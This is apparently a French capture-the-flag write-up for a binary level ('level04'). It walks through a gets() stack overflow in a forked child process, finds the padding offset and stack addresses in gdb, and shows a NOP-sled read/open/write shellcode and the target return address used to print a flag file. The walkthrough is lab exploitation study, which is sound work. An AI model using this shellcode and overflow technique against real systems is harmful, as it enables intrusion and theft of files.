Lorsque nous analysons le code, nous constatons que nous lancons un processus enfant. Grace au buffer (et gets) nous pourrions changer la valeur de retour EIP par un shellcode, c'est d'ailleurs ce qui est suggere par la phrase: "Give me some shellcode".

Le processus parent surveille cependant a ce que syscall_num != 11, 11 correspondant a SYS_EXECVE. Nous ne pouvons donc pas envoyer un shellcode execve, nous allons donc essayer de lire directement le fichier et print son resultat dans notre terminal.




# Trouver le padding:

```shell
gdb ./level04
set follow-fork-mode child
run <<< $(python -c "print 'A'*128 + 'qwertyuiopasdfghjklzxcvbnm0123456789'")
#On segfault: 0x35343332 in ?? ()
print/c 0x35343332
#$2 = 50 '2'
```

--> 2 est le 29eme char (+128 A), le padding est donc de 156.

# Trouver l'adresse de debut de la stack:

```shell
x/40x $esp-100

0xffffd2bc:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd2cc:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd2dc:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd2ec:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd2fc:	0x41414141	0x72657771	0x69757974	0x7361706f
0xffffd30c:	0x68676664	0x7a6c6b6a	0x62766378	0x31306d6e
0xffffd31c:	0x35343332	0x39383736	0xffffd300	0xffffd3bc
0xffffd32c:	0xf7fd3000	0x00000000	0xffffd31c	0xffffd3bc
0xffffd33c:	0x00000000	0x080482e0	0xf7fceff4	0x00000000
0xffffd34c:	0x00000000	0x00000000	0x15f7c2a3	0x22f826b3

```

# Shellcode read/open/write

```shell
export SHELLCODE=$(python -c "print '\x90'*1000 + '\x31\xc9\x51\x68\x66\x6c\x61\x67\x89\xe3\x31\xc0\xb0\x05\xcd\x80\x89\xc3\x89\xe1\x31\xd2\xb2\x64\x31\xc0\xb0\x03\xcd\x80\xbb\x01\x00\x00\x00\x31\xc0\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80'")
```

On va egalement avoir besoin de l'adresse de SHELLCODE:

```shell
gdb ./level04
break main
# Breakpoint 1, 0x080486cd in main ()
run
print (char *)getenv("SHELLCODE")
# On obtient $1 = 0xffffd4e0
```

--> L'adresse de base est `0xffffd4e0`. 
L'environnement dans GDB étant légèrement différent de celui du bash pur, nous n'allons pas viser le tout début de l'adresse. Nous ajoutons 100 octets (`0x60`) pour viser le milieu de notre NOP sled.
`0xffffd4e0 + 0x60` = **`0xFFFFD540`**
En Little Endian, notre adresse finale est : `\x40\xd5\xff\xff`

